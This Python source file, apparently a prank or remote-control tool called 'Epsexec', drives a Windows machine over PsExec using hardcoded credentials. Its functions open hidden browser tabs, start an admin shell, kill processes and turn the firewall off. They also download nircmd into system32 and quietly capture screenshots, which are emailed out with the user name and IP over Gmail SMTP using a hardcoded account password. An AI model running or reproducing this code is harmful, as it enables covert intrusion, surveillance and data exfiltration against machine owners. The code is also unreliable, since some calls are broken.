import os
import sys
import colorama
colorama.init()
import time
import subprocess # from subprocess import call


class psPc:
	def __init__(self,ip,username,password):
		self.ip = ip
		self.username = username
		self.password = password

		self.adminSetting = "-s"
		self.dontWaitForTerminate = "-d"
		self.interactive = "-i" 
	
	
	def openURL(self,URL="*://*/*",fromFile="@fileName.txt",tabs=1,newWindow=False,delayBeforeOpening=100,delayBetweenTabs=100,incognito=False,invisible=False):

		#set minimum requirements for delay before opening and delay between tab
		delayBeforeOpening = 1 if delayBeforeOpening < 1 else delayBeforeOpening
		delayBeforeOpening /= 1000
		delayBetweenTabs = 100 if delayBetweenTabs < 100 else delayBetweenTabs
		delayBetweenTabs /= 1000

		#get incognito value 
		if incognito:
			incognito = " -incognito"
		else:
			incognito = ""

		# --new-window to get new tab
		if newWindow:
			newWindow = "--new-window"
		else:
			newWindow = ""

		#IMPORT FROM FILE ################################3
		if fromFile != "@fileName.txt":
			#TODO: IMPLEMENT THE IMPORT FUNCTION.
			# get user text file name (fromFile)
			# save into list using a pre-made config structure
			# output to the user the things
			# get user's choice
			
			File = open(fromFile,'r',encoding="UTF-8-sig")
			urls = {}
			
			for line in File.readlines():
				if "urls:" in line:
					continue
				if "endurl" in line:
					break
				# get name and URL to assign to the dictionary. split them by space and get only the string itself without special characters like \n or \t
				name = line.split(' ')[0][1:]
				url = line.split(' ')[1][:-1]
				urls[name] = url
				# ended getting values from file    
			File.close()

			##########################################
				#what does the USER want?
			userIndex = 1
			for shotName,url in urls.items():
				print(Fore.LIGHTBLUE_EX + f" {userIndex}." + Fore.RESET + f" {shotName} ........... {url}")
				userIndex += 1
			userIndex = int(input("Choice: "))
			print(f"you want: {list(urls.values())[userIndex-1]}")
			# get the list of the urls and get the user's index minus 1 cuz it starts at 0.
			URL = list(urls.values())[userIndex-1]
			print(URL)
			os.system("pause")


		#sleep before opening tabs
		time.sleep(delayBeforeOpening)

		if invisible:
			#if user wants invisible to be True:
			if delayBetweenTabs <= 500 and newWindow != "--new-window":
				subprocess.call(f"psexec \\\\{self.ip} -u {self.username} -p {self.password} {self.dontWaitForTerminate} cmd /c start " + f" {URL} "*tabs + f" {newWindow} {incognito} ",shell=True)
			for tab in range(1,tabs+1):
				#make invisible somehow...
				subprocess.call(f"psexec \\\\{self.ip} -u {self.username} -p {self.password} {self.dontWaitForTerminate} cmd /c start {URL} {newWindow} {incognito} ",shell=True)
				time.sleep(float("0.%i" % delayBetweenTabs))
		else:
			#if user DOES NOT WANT invisible:
			# if we can do it in one line, do it
			if delayBetweenTabs <= 500 and newWindow != "--new-window":
				subprocess.call(f"psexec \\\\{self.ip} -u {self.username} -p {self.password} {self.interactive} {self.dontWaitForTerminate} \"C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe\"" + f" {URL} " * tabs + f" {newWindow} {incognito}")
			else:
				for tab in range(1,tabs+1):
					#make start visible
					subprocess.call(f"psexec \\\\{self.ip} -u {self.username} -p {self.password} {self.interactive} {self.dontWaitForTerminate} \"C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe\" {URL} {newWindow} {incognito}",shell=True)
					time.sleep(float("0.%i" % delayBetweenTabs))


	def getShell(self,shell="cmd.exe",isAdmin = True):
		if isAdmin == False:
			self.adminSetting = ''
		subprocess.call(f"psexec \\\\{self.ip} -u {self.username} -p {self.password} {self.adminSetting} {shell}",shell=False)
		self.adminSetting = '-s'

	def closeProcess(self,procNameOrID,sleepBefore=100):
		#if sleep before less than 1, NO.
		sleepBefore /= 1000
		time.sleep(sleepBefore)		

		subprocess.call(f"psexec \\\\{self.ip} -u {self.username} -p {self.password} {self.dontWaitForTerminate} cmd.exe /c taskkill /F /IM {procNameOrID} /T")    
	
	def firewallChange(self,state="off",sleepBefore=100):
		#if sleep before less than 1, NO.
		sleepBefore /= 1000
		time.sleep(sleepBefore)
		if state == "rule":
			subprocess.call(f'psexec \\\\{self.ip} -u {self.username} -p {self.password} {self.dontWaitForTerminate} {self.adminSetting} cmd.exe /c netsh advfirewall firewall set rule name="File and Printer Sharing (SMB-In)" dir=in new enable=Yes')
		else:
			subprocess.call(f"psexec \\\\{self.ip} -u {self.username} -p {self.password} {self.dontWaitForTerminate} {self.adminSetting} cmd.exe /c netsh advfirewall set allprofiles state {state}")

	def startRemoteDesktop(self):
		subprocess.call(f"mstsc /v {self.username}")

	def downloadNirCMD(self):
		subprocess.call(f'psexec \\\\{self.ip} -u {self.username} -p {self.password} {self.dontWaitForTerminate} {self.adminSetting} powershell /c wget """http://www.nirsoft.net/utils/nircmd-x64.zip""" -OutFile C:\\windows\\system32\\nircmd.zip; Expand-Archive -Force C:\\windows\\system32\\nircmd.zip -DestinationPath C:\\windows\\system32; del C:\\windows\\system32\\nircmd.zip')

	def setVolume(self,precent,sleepBefore=100):
		#if sleep before less than 1, NO.
		sleepBefore /= 1000
		time.sleep(sleepBefore)
		#max = 65535
		numFromPrec = 655*precent
		subprocess.call(f"psexec \\\\{self.ip} -u {self.username} -p {self.password} {self.dontWaitForTerminate} {self.adminSetting} nircmd.exe cmdwait {sleepBefore} setsysvolume {numFromPrec}")
	
	def textToSpeech(self,text,MaleVoice=True,sleepBefore=100):
		#if sleep before less than 1, NO.
		sleepBefore /= 1000
		time.sleep(sleepBefore)

		# self.adminsetting for male
		if not MaleVoice:
			self.adminSetting = ""
		subprocess.call(f"psexec \\\\{self.ip} -u {self.username} -p {self.password} {self.dontWaitForTerminate} {self.adminSetting} {self.interactive} nircmd.exe speak text \"{text}\"")
		self.adminSetting = "-s"


	def beep(self,frequency,durationMs,sleepBefore=100):
		#if sleep before less than 1, NO.
		sleepBefore /= 1000
		time.sleep(sleepBefore)

		# self.interactive (-i) is a MUST
		subprocess.call(f"psexec \\\\{self.ip} -u {self.username} -p {self.password} {self.dontWaitForTerminate} {self.interactive} nircmd.exe beep {frequency} {durationMs}")
	
	def sendScreenshot(self,emailRecipientAddr,sleepBefore=100):
		sleepBefore /= 1000

		body = "<center>"
		body += "<p dir=\"\"ltr\"\" center=\"\"true\"\">"
		body += "<b><font size=4>"
		body += "Computer Information:"
		body += "</font><br >"
		body += "<font size=3>"
		body += "User:"
		body += "</font>"
		body += " $($i.CsUsername)<br>"
		
		body += "<font size=3>"
		body += "IP: "
		body += "</font>"
		body += "$($ip[0].IPAddressToString)"
		body += "<br>"
		body += "<font size=3>"
		body += "CPU: "
		body += "</font>"
		body += "$($i.CsProcessors.Name)"
		body += "</b>"
		body += "</p>"
		body += "</center>"
		#m = message
		#c = SMTPClient
		#i = Get-ComputerInfo
		powershellCommand = "$ip=$([System.Net.Dns]::GetHostAddresses($hostname)); "
		powershellCommand += "$i = Get-ComputerInfo; "
		powershellCommand += "$m=New-Object System.Net.Mail.MailMessage; "
		powershellCommand += f'$m.subject="""ScreenShot Captured from {self.ip}"""; '
		powershellCommand += "$m.IsBodyHtml=$true; "
		powershellCommand += f'$m.body = """{body}"""; '
		powershellCommand += f'$m.to.add("""{emailRecipientAddr}"""); '
		powershellCommand += '$m.from="""Epsexec@NoReply <EpsexecNoReply@gmail.com>"""; '
		powershellCommand += '$m.attachments.add("""C:\\EpsexecScreenshot.png"""); '
		powershellCommand += '$c=New-Object Net.Mail.SmtpClient("""smtp.gmail.com""", 587); '
		powershellCommand += "$c.EnableSsl=$true; "
		powershellCommand += '$c.Credentials=New-Object System.Net.NetworkCredential("""EpsexecNoReply@gmail.com""", """WBjEwZ0b1d85"""); '
		powershellCommand += "$c.Send($m)"
		#sleeeep
		time.sleep(sleepBefore)
		subprocess.call(f"psexec \\\\{self.ip} -u {self.username} -p {self.password} {self.interactive} {self.adminSetting} nircmd savescreenshot C:\\EpsexecScreenshot.png")

		subprocess.call(f"psexec \\\\{self.ip} -u {self.username} -p {self.password} {self.dontWaitForTerminate} powershell.exe {powershellCommand}")

	def closeChrome(self,sleepBefore=100,runAsAdmin=True):
		#if sleep before less than 1, NO.
		sleepBefore /= 1000
		time.sleep(sleepBefore)
		if not runAsAdmin:
			self.adminSetting = ''
		subprocess.call(f"psexec \\\\{self.ip} -u {self.username} -p {self.password} {self.adminSetting} cmd.exe /c taskkill /F /IM chrome.exe /t")
		self.adminSetting = '-s'

#   def addURLtoFile(self,fileNames,URLs):
#       fileNames = list(fileNames.split(','))
#       URLs = list(URLS.split(','))

if not sys.maxsize > 2**32:
	print(colorama.Fore.RED + "\n\n\n\n                    I'm affraid you must have a 64-bit installation of python or Epsexec will not work.\n\n\n\n")


pc = psPc("10.100.102.15","ori","123")

#pc.openURL("https://www.google.com",tabs=2,newWindow=False,incognito=True)
pc.firewallChange("rule")